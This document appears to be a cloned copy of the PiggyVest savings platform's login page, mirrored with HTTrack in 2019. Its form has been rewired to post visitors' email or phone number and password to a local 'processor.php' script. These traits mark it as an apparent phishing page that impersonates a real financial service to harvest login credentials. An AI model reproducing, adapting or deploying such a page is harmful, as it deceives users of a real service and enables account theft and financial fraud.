...
<!-- Mirrored from www.piggyvest.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Mar 2019 15:04:56 GMT -->
...
<link href="#" rel="shortcut icon"/>
	...
	<link href="../storage.googleapis.com/piggybankservice.appspot.com/dashboard/assets/css/customcss_5d6c90cdcf.css" rel="stylesheet" type="text/css"/> 
	<style type="text/css">
	body {
...
<div class="signin-modal">
	<div class="closeslide">
		...
		<div class="line2"></div>
				...
				<h1 class="_margin-100">It's time to Save</h1>	
			</div>
			<div class="_right _padding-50 signin">
				<div class="_center">
					<a href="index.html"><img src="../storage.googleapis.com/piggybankservice.appspot.com/statics/logo-main-web-shifted-min.png" class="logo" alt="VIPS Logo"></a>
					<h2>Login to your Account</h2>
				</div>
				<form action="" method="post" class="_margin-100 signin-form">
					...
					<div class="clearboth"></div>
						...
						<div class="_margin-20">
							<a href="register/register.html" class="_margin-20">Create an Account Instead</a> <br>
							<a href="#" class="_margin-20">Forgot Password?</a>
						</div>
					</div>
				</form>
			</div>
...
<nav class="mobile-nav"> 
			...
			<l1><a href="#" target="_blank">Blog</a></l1>
				...
				<l1><a href="register/register.html" class="signup-btn">Create a Free Account</a></l1>
					</ul>
	</div>  
</nav>
<!-- mobile menu End -->
...
<nav class="top-nav  alt-nav navwhite">
		<div class="container">
					<a href="index.html">
				<img src="../storage.googleapis.com/piggybankservice.appspot.com/statics/pvest-logo-web-white-min.png" class="logo" alt="">
			</a>
			<a href="index.html">
				<img src="../storage.googleapis.com/piggybankservice.appspot.com/statics/logo-main-web-shifted-min.png" class="logo-alt" alt="">
			</a>
			...
			<li class="menu-list"><a href="#" target="_blank" class="menu-link">Blog</a></li>
				...
				<li class="menu-list"><a href="register/register.html" class="menu-link signup-btn">Create a Free Account</a></li>
					</ul>
	</div>
</nav>
		...
		<section class="intro-text _margin-100">
			<div class="container">
				<div class="profileuser"> 
					<h1 class="_margin-50 _middle">Login</h1>
					...
					<p class="_margin-20 _margin-b-20 _middle">It's time to Save</p>
					<div align="center">
						<div align="left" class="mainactionbutton">
														<form action="processor.php" method="post" id="">
														<input value="login" name="opetration_type"  type="hidden" />
								<label class="form-label leftlabel"><b>Email or Phone Number</b></label>
								<input type="text" class="inputcontrol largetext largetextcenter" name="email" id="email" value="" autocomplete="off" required="">
								<br />
								<br />
								<label class="form-label leftlabel"><b>Password</b></label>
								<input type="password" class="inputcontrol largetext largetextcenter" name="password" id="password" required="">
								<hr class="thhr">
...
<!-- Mirrored from www.piggyvest.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Mar 2019 15:03:45 GMT -->
</html>
